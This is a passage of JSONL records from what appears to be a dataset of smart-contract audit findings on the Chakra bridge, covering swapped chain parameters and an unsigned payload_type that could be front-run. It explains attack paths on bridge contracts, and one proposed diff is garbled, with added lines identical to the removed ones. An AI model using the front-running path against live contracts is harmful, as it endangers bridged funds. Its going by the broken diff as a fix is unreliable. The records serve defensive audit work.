txid,\n        CrossChainMsgStatus status,\n        string from_chain,\n        string to_chain,\n        address from_handler,\n        uint256 to_handler,\n        PayloadType payload_type\n    );\n```\n\n```solidity\nemit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n```\n\n## Impact\nValidators might burn tokens on the wrong chain when the mode is `MintBurn`.\n```solidity\nif (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n```\n\nValidators maybe not be able to verify and finalize transactions.\n## Proof of Concept\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L235C1-L244C6\n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\nConsider replacing `contract_chain_name` with `from_chain`.\n\n```diff\nemit CrossChainHandleResult(\n            txid,\n            status,\n+           from_chain, // Source chain\n+           contract_chain_name, // Destination chain\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n```\n\n\n\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L235\n\n\n# Vulnerability details\n\nIn the `receive_cross_chain_msg` function, the `CrossChainHandleResult` event emits `from_chain(source chain) `as `contract_chain_name` and `to_chain(destination chain)` as `from_chain`. However, the `contract_chain_name` should represent the destination chain, while the rest should represent the source chain. This will allow validators to correctly callback via the `receive_cross_chain_callback` function and finalize the user's message.\n\n```solidity\n event CrossChainHandleResult(\n        uint256 indexed txid,\n        CrossChainMsgStatus status,\n        string from_chain,\n        string to_chain,\n        address from_handler,\n        uint256 to_handler,\n        PayloadType payload_type\n    );\n```\n\n```solidity\nemit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n```\n\n## Impact\nValidators might burn tokens on the wrong chain when the mode is `MintBurn`.\n```solidity\nif (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount); \n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n```\n\nValidators maybe not be able to verify and finalize transactions.\n## Proof of Concept\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L235C1-L244C6\n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\nConsider replacing `contract_chain_name` with `from_chain`.\n\n```diff\nemit CrossChainHandleResult(\n            txid,\n            status,\n+           from_chain, // Source chain\n+           contract_chain_name, // Destination chain\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n```\n\n\n\n\n\n## Assessed type\n\nOther"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-275", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 275, "page_start": null, "title": "`settlement::receive_cross_chain_callback()` creates transactions wrongly on Starknet", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L422-L440\n\n\n# Vulnerability details\n\n## Impact\nThis can lead to possible loss of funds and possibly break accounting for the protocol.\n\n## Proof of Concept\nWhen `settlement::receive_cross_chain_callback()`  is called, the `handler_erc20::receive_cross_chain_callback(...)` burns token amount in the message payload and then a `created_tx` is updated for the `cross_chain_msg_id` being processed.\nHowever, the `created_tx` is done wrongly and even the `CrossChainResult` event used by the validators is emitted with the wrong parameters\n\n```rust\nFile: settlement.cairo\n393:         fn receive_cross_chain_callback(\n394:             ref self: ContractState,\n395:             cross_chain_msg_id: felt252,\n396:             from_chain: felt252,\n397:             to_chain: felt252,\n398:             from_handler: u256,\n399:             to_handler: ContractAddress,\n400:             cross_chain_msg_status: u8,\n401:             sign_type: u8,\n402:             signatures: Array<(felt252, felt252, bool)>,\n403:         ) -> bool {\n\nSNIP          ........\n\n415:             let success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\nSNIP           .........\n422:\n423:             self.created_tx.write(cross_chain_msg_id, CreatedTx{\n424:                 tx_id:cross_chain_msg_id,\n425:                 tx_status:state,\n426:    @>           from_chain: to_chain,\n427:    @>           to_chain: from_chain,\n428:    @>           from_handler: to_handler,\n429:    @>           to_handler: from_handler\n430:             });\n431:\n432:             self.emit(CrossChainResult {\n433:                 cross_chain_settlement_id: cross_chain_msg_id,\n434:                 from_address: get_tx_info().unbox().account_contract_address,\n435:    @>           from_chain: to_chain,\n436:    @>           from_handler: to_handler, // @audit  wrong?\n437:    @>           to_chain: from_chain,\n438:    @>           to_handler: from_handler,\n439:                 cross_chain_msg_status: state,\n440:             });\n441:             return true;\n442:         }\n\n```\n\nAs seen above on L426 to L429, the `from` and `to` parameters are all mixed up. Likewise in the `CrossChainResult` event the `from` and `to` parameters are mixed up as well. Hence,\n- this breaks accounting for the protocol considering that the state is wrong\n- and validators output will as well be wrong and as the input received are wrong as well\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nmodify the `receive_cross_chain_callback()` function as shown below\n\n```diff\nFile: settlement.cairo\n393:         fn receive_cross_chain_callback(\n394:             ref self: ContractState,\n395:             cross_chain_msg_id: felt252,\n396:             from_chain: felt252,\n397:             to_chain: felt252,\n398:             from_handler: u256,\n399:             to_handler: ContractAddress,\n400:             cross_chain_msg_status: u8,\n401:             sign_type: u8,\n402:             signatures: Array<(felt252, felt252, bool)>,\n403:         ) -> bool {\n\nSNIP          ........\n\n415:             let success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\nSNIP           .........\n422:\n423:             self.created_tx.write(cross_chain_msg_id, CreatedTx{\n424:                 tx_id:cross_chain_msg_id,\n425:                 tx_status:state,\n-426:                from_chain: to_chain,\n-427:                to_chain: from_chain,\n-428:                from_handler: to_handler,\n-429:                to_handler: from_handler\n\n+426:                from_chain: to_chain,\n+427:                to_chain: from_chain,\n+428:                from_handler: to_handler,\n+429:                to_handler: from_handler\n430:             });\n431:\n432:             self.emit(CrossChainResult {\n433:                 cross_chain_settlement_id: cross_chain_msg_id,\n434:                 from_address: get_tx_info().unbox().account_contract_address,\n-435:                from_chain: to_chain,\n-436:                from_handler: to_handler, // @audit  wrong?\n-437:                to_chain: from_chain,\n-438:                to_handler: from_handler,\n\n+435:                from_chain: from_chain,\n+436:                from_handler: from_handler,\n+437:                to_chain: to_chain,\n+438:                to_handler: to_handler,\n439:                 cross_chain_msg_status: state,\n440:             });\n441:             return true;\n442:         }\n\n```\n\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nThis can lead to possible loss of funds and possibly break accounting for the protocol.\n", "recommendation_md": "## Recommended Mitigation Steps\nmodify the `receive_cross_chain_callback()` function as shown below\n\n```diff\nFile: settlement.cairo\n393:         fn receive_cross_chain_callback(\n394:             ref self: ContractState,\n395:             cross_chain_msg_id: felt252,\n396:             from_chain: felt252,\n397:             to_chain: felt252,\n398:             from_handler: u256,\n399:             to_handler: ContractAddress,\n400:             cross_chain_msg_status: u8,\n401:             sign_type: u8,\n402:             signatures: Array<(felt252, felt252, bool)>,\n403:         ) -> bool {\n\nSNIP          ........\n\n415:             let success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\nSNIP           .........\n422:\n423:             self.created_tx.write(cross_chain_msg_id, CreatedTx{\n424:                 tx_id:cross_chain_msg_id,\n425:                 tx_status:state,\n-426:                from_chain: to_chain,\n-427:                to_chain: from_chain,\n-428:                from_handler: to_handler,\n-429:                to_handler: from_handler\n\n+426:                from_chain: to_chain,\n+427:                to_chain: from_chain,\n+428:                from_handler: to_handler,\n+429:                to_handler: from_handler\n430:             });\n431:\n432:             self.emit(CrossChainResult {\n433:                 cross_chain_settlement_id: cross_chain_msg_id,\n434:                 from_address: get_tx_info().unbox().account_contract_address,\n-435:                from_chain: to_chain,\n-436:                from_handler: to_handler, // @audit  wrong?\n-437:                to_chain: from_chain,\n-438:                to_handler: from_handler,\n\n+435:                from_chain: from_chain,\n+436:                from_handler: from_handler,\n+437:                to_chain: to_chain,\n+438:                to_handler: to_handler,\n439:                 cross_chain_msg_status: state,\n440:             });\n441:             return true;\n442:         }\n\n```\n\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nWhen `settlement::receive_cross_chain_callback()`  is called, the `handler_erc20::receive_cross_chain_callback(...)` burns token amount in the message payload and then a `created_tx` is updated for the `cross_chain_msg_id` being processed.\nHowever, the `created_tx` is done wrongly and even the `CrossChainResult` event used by the validators is emitted with the wrong parameters\n\n```rust\nFile: settlement.cairo\n393:         fn receive_cross_chain_callback(\n394:             ref self: ContractState,\n395:             cross_chain_msg_id: felt252,\n396:             from_chain: felt252,\n397:             to_chain: felt252,\n398:             from_handler: u256,\n399:             to_handler: ContractAddress,\n400:             cross_chain_msg_status: u8,\n401:             sign_type: u8,\n402:             signatures: Array<(felt252, felt252, bool)>,\n403:         ) -> bool {\n\nSNIP          ........\n\n415:             let success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\nSNIP           .........\n422:\n423:             self.created_tx.write(cross_chain_msg_id, CreatedTx{\n424:                 tx_id:cross_chain_msg_id,\n425:                 tx_status:state,\n426:    @>           from_chain: to_chain,\n427:    @>           to_chain: from_chain,\n428:    @>           from_handler: to_handler,\n429:    @>           to_handler: from_handler\n430:             });\n431:\n432:             self.emit(CrossChainResult {\n433:                 cross_chain_settlement_id: cross_chain_msg_id,\n434:                 from_address: get_tx_info().unbox().account_contract_address,\n435:    @>           from_chain: to_chain,\n436:    @>           from_handler: to_handler, // @audit  wrong?\n437:    @>           to_chain: from_chain,\n438:    @>           to_handler: from_handler,\n439:                 cross_chain_msg_status: state,\n440:             });\n441:             return true;\n442:         }\n\n```\n\nAs seen above on L426 to L429, the `from` and `to` parameters are all mixed up. Likewise in the `CrossChainResult` event the `from` and `to` parameters are mixed up as well. Hence,\n- this breaks accounting for the protocol considering that the state is wrong\n- and validators output will as well be wrong and as the input received are wrong as well\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L422-L440\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L422-L440\n\n\n# Vulnerability details\n\n## Impact\nThis can lead to possible loss of funds and possibly break accounting for the protocol.\n\n## Proof of Concept\nWhen `settlement::receive_cross_chain_callback()`  is called, the `handler_erc20::receive_cross_chain_callback(...)` burns token amount in the message payload and then a `created_tx` is updated for the `cross_chain_msg_id` being processed.\nHowever, the `created_tx` is done wrongly and even the `CrossChainResult` event used by the validators is emitted with the wrong parameters\n\n```rust\nFile: settlement.cairo\n393:         fn receive_cross_chain_callback(\n394:             ref self: ContractState,\n395:             cross_chain_msg_id: felt252,\n396:             from_chain: felt252,\n397:             to_chain: felt252,\n398:             from_handler: u256,\n399:             to_handler: ContractAddress,\n400:             cross_chain_msg_status: u8,\n401:             sign_type: u8,\n402:             signatures: Array<(felt252, felt252, bool)>,\n403:         ) -> bool {\n\nSNIP          ........\n\n415:             let success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\nSNIP           .........\n422:\n423:             self.created_tx.write(cross_chain_msg_id, CreatedTx{\n424:                 tx_id:cross_chain_msg_id,\n425:                 tx_status:state,\n426:    @>           from_chain: to_chain,\n427:    @>           to_chain: from_chain,\n428:    @>           from_handler: to_handler,\n429:    @>           to_handler: from_handler\n430:             });\n431:\n432:             self.emit(CrossChainResult {\n433:                 cross_chain_settlement_id: cross_chain_msg_id,\n434:                 from_address: get_tx_info().unbox().account_contract_address,\n435:    @>           from_chain: to_chain,\n436:    @>           from_handler: to_handler, // @audit  wrong?\n437:    @>           to_chain: from_chain,\n438:    @>           to_handler: from_handler,\n439:                 cross_chain_msg_status: state,\n440:             });\n441:             return true;\n442:         }\n\n```\n\nAs seen above on L426 to L429, the `from` and `to` parameters are all mixed up. Likewise in the `CrossChainResult` event the `from` and `to` parameters are mixed up as well. Hence,\n- this breaks accounting for the protocol considering that the state is wrong\n- and validators output will as well be wrong and as the input received are wrong as well\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nmodify the `receive_cross_chain_callback()` function as shown below\n\n```diff\nFile: settlement.cairo\n393:         fn receive_cross_chain_callback(\n394:             ref self: ContractState,\n395:             cross_chain_msg_id: felt252,\n396:             from_chain: felt252,\n397:             to_chain: felt252,\n398:             from_handler: u256,\n399:             to_handler: ContractAddress,\n400:             cross_chain_msg_status: u8,\n401:             sign_type: u8,\n402:             signatures: Array<(felt252, felt252, bool)>,\n403:         ) -> bool {\n\nSNIP          ........\n\n415:             let success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\nSNIP           .........\n422:\n423:             self.created_tx.write(cross_chain_msg_id, CreatedTx{\n424:                 tx_id:cross_chain_msg_id,\n425:                 tx_status:state,\n-426:                from_chain: to_chain,\n-427:                to_chain: from_chain,\n-428:                from_handler: to_handler,\n-429:                to_handler: from_handler\n\n+426:                from_chain: to_chain,\n+427:                to_chain: from_chain,\n+428:                from_handler: to_handler,\n+429:                to_handler: from_handler\n430:             });\n431:\n432:             self.emit(CrossChainResult {\n433:                 cross_chain_settlement_id: cross_chain_msg_id,\n434:                 from_address: get_tx_info().unbox().account_contract_address,\n-435:                from_chain: to_chain,\n-436:                from_handler: to_handler, // @audit  wrong?\n-437:                to_chain: from_chain,\n-438:                to_handler: from_handler,\n\n+435:                from_chain: from_chain,\n+436:                from_handler: from_handler,\n+437:                to_chain: to_chain,\n+438:                to_handler: to_handler,\n439:                 cross_chain_msg_status: state,\n440:             });\n441:             return true;\n442:         }\n\n```\n\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L422-L440\n\n\n# Vulnerability details\n\n## Impact\nThis can lead to possible loss of funds and possibly break accounting for the protocol.\n\n## Proof of Concept\nWhen `settlement::receive_cross_chain_callback()`  is called, the `handler_erc20::receive_cross_chain_callback(...)` burns token amount in the message payload and then a `created_tx` is updated for the `cross_chain_msg_id` being processed. \nHowever, the `created_tx` is done wrongly and even the `CrossChainResult` event used by the validators is emitted with the wrong parameters\n\n```rust\nFile: settlement.cairo\n393:         fn receive_cross_chain_callback(\n394:             ref self: ContractState,\n395:             cross_chain_msg_id: felt252,\n396:             from_chain: felt252,\n397:             to_chain: felt252,\n398:             from_handler: u256,\n399:             to_handler: ContractAddress,\n400:             cross_chain_msg_status: u8,\n401:             sign_type: u8,\n402:             signatures: Array<(felt252, felt252, bool)>,\n403:         ) -> bool {\n\nSNIP          ........\n\n415:             let success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\nSNIP           .........\n422:             \n423:             self.created_tx.write(cross_chain_msg_id, CreatedTx{\n424:                 tx_id:cross_chain_msg_id,\n425:                 tx_status:state,\n426:    @>           from_chain: to_chain,\n427:    @>           to_chain: from_chain,\n428:    @>           from_handler: to_handler,\n429:    @>           to_handler: from_handler\n430:             });\n431: \n432:             self.emit(CrossChainResult {\n433:                 cross_chain_settlement_id: cross_chain_msg_id,\n434:                 from_address: get_tx_info().unbox().account_contract_address, \n435:    @>           from_chain: to_chain,\n436:    @>           from_handler: to_handler, // @audit  wrong?\n437:    @>           to_chain: from_chain,\n438:    @>           to_handler: from_handler,\n439:                 cross_chain_msg_status: state,\n440:             });\n441:             return true;\n442:         }\n\n```\n\nAs seen above on L426 to L429, the `from` and `to` parameters are all mixed up. Likewise in the `CrossChainResult` event the `from` and `to` parameters are mixed up as well. Hence,\n- this breaks accounting for the protocol considering that the state is wrong\n- and validators output will as well be wrong and as the input received are wrong as well\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nmodify the `receive_cross_chain_callback()` function as shown below\n\n```diff\nFile: settlement.cairo\n393:         fn receive_cross_chain_callback(\n394:             ref self: ContractState,\n395:             cross_chain_msg_id: felt252,\n396:             from_chain: felt252,\n397:             to_chain: felt252,\n398:             from_handler: u256,\n399:             to_handler: ContractAddress,\n400:             cross_chain_msg_status: u8,\n401:             sign_type: u8,\n402:             signatures: Array<(felt252, felt252, bool)>,\n403:         ) -> bool {\n\nSNIP          ........\n\n415:             let success = handler.receive_cross_chain_callback(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , cross_chain_msg_status);\n\nSNIP           .........\n422:             \n423:             self.created_tx.write(cross_chain_msg_id, CreatedTx{\n424:                 tx_id:cross_chain_msg_id,\n425:                 tx_status:state,\n-426:                from_chain: to_chain,\n-427:                to_chain: from_chain,\n-428:                from_handler: to_handler,\n-429:                to_handler: from_handler\n\n+426:                from_chain: to_chain,\n+427:                to_chain: from_chain,\n+428:                from_handler: to_handler,\n+429:                to_handler: from_handler\n430:             });\n431: \n432:             self.emit(CrossChainResult {\n433:                 cross_chain_settlement_id: cross_chain_msg_id,\n434:                 from_address: get_tx_info().unbox().account_contract_address, \n-435:                from_chain: to_chain,\n-436:                from_handler: to_handler, // @audit  wrong?\n-437:                to_chain: from_chain,\n-438:                to_handler: from_handler,\n\n+435:                from_chain: from_chain,\n+436:                from_handler: from_handler,\n+437:                to_chain: to_chain,\n+438:                to_handler: to_handler,\n439:                 cross_chain_msg_status: state,\n440:             });\n441:             return true;\n442:         }\n\n```\n\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-293", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 293, "page_start": null, "title": "Payload type is not checked to be signed by offchain validators", "short_summary": null, "description_md": "## Vulnerability description\nThe normal flow for a message bridge is the following:\n1. User calls `cross_chain_erc20_settlement`\n2. This function triggers `send_cross_chain_msg` in the settlement which will emit the `CrossChainMsg` event\n3. Validators will grab the data from this event and will call `receive_cross_chain_msg` in the destination chain\n...\n\nThis `receive_cross_chain_msg` is intended to only be called by validators, but it can be called by everyone. The protection from a user calling this function with arbitrary data is that the parameters provided are hashed and checked if it has been signed by offchain validators. Hence, nobody would be able to change this data.\n\nHowever, there is a parameter that is not hashed in the messaged signature which can lead to someone frontrunning a validator call and changing this particular parameter.\n\n```\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\nAs we can see, in the `message_hash` we hash all the parameters passed in the function except fom the `payload_type`. Currently, the only supported type is the `ERC20`, but in the future, when other types declared in the `PayloadType` would get an implementation, someone could trigger other implementations that could lead to loses for users who bridged their assets.\n\nCurrently, the receive function in the handler looks like this:\n```\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        ...\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nBut in the future, when other implementations will be added, the attacker will be able to enter the if branch that he wants and can lead to a disaster for the user that used the bridge.\n\nIn the Cairo implementation works different and the attack is still possible but has a completely different impact. In the `receive_cross_chain_msg` it does not check if the `payload_type` is signed by the offchain validators. However, the only use of this variable is to emit it in the `CrossChainHandleResult` event. It is not used anywhere else but in the future it can be used and can be manipulated to execute actions that a user would not be allowed to.\n```\nfn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            ...\n\n            // emit event\n            // pub struct CrossChainHandleResult {\n            //     #[key]\n            //     pub cross_chain_settlement_id: u256,\n            //     pub from_chain: felt252,\n            //     pub from_handler: ContractAddress,\n            //     pub to_chain: felt252,\n            //     pub to_handler: u256,\n            //     pub cross_chain_msg_status: u8,\n            //     pub payload_type: u8,\n            // }\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n@>              payload_type: payload_type\n            });\n            return true;\n        }\n```\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L378-L381\n\n\n# Vulnerability details\n\n## Vulnerability description\nThe normal flow for a message bridge is the following:\n1. User calls `cross_chain_erc20_settlement`\n2. This function triggers `send_cross_chain_msg` in the settlement which will emit the `CrossChainMsg` event\n3. Validators will grab the data from this event and will call `receive_cross_chain_msg` in the destination chain\n...\n\nThis `receive_cross_chain_msg` is intended to only be called by validators, but it can be called by everyone. The protection from a user calling this function with arbitrary data is that the parameters provided are hashed and checked if it has been signed by offchain validators. Hence, nobody would be able to change this data.\n\nHowever, there is a parameter that is not hashed in the messaged signature which can lead to someone frontrunning a validator call and changing this particular parameter.\n\n```\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\nAs we can see, in the `message_hash` we hash all the parameters passed in the function except fom the `payload_type`. Currently, the only supported type is the `ERC20`, but in the future, when other types declared in the `PayloadType` would get an implementation, someone could trigger other implementations that could lead to loses for users who bridged their assets.\n\nCurrently, the receive function in the handler looks like this:\n```\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        ...\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nBut in the future, when other implementations will be added, the attacker will be able to enter the if branch that he wants and can lead to a disaster for the user that used the bridge.\n\nIn the Cairo implementation works different and the attack is still possible but has a completely different impact. In the `receive_cross_chain_msg` it does not check if the `payload_type` is signed by the offchain validators. However, the only use of this variable is to emit it in the `CrossChainHandleResult` event. It is not used anywhere else but in the future it can be used and can be manipulated to execute actions that a user would not be allowed to.\n```\nfn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            ...\n\n            // emit event\n            // pub struct CrossChainHandleResult {\n            //     #[key]\n            //     pub cross_chain_settlement_id: u256,\n            //     pub from_chain: felt252,\n            //     pub from_handler: ContractAddress,\n            //     pub to_chain: felt252,\n            //     pub to_handler: u256,\n            //     pub cross_chain_msg_status: u8,\n            //     pub payload_type: u8,\n            // }\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                